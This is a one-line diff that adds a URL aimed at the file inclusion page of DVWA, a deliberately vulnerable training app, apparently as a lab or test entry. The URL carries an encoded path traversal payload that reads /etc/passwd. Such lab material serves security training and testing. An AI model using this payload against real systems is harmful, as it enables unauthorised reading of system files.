@@ -1,0 +1,1 @@
+http://dvwa.ccc.com/vulnerabilities/fi/?page=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&bookcase=book05-browser-path
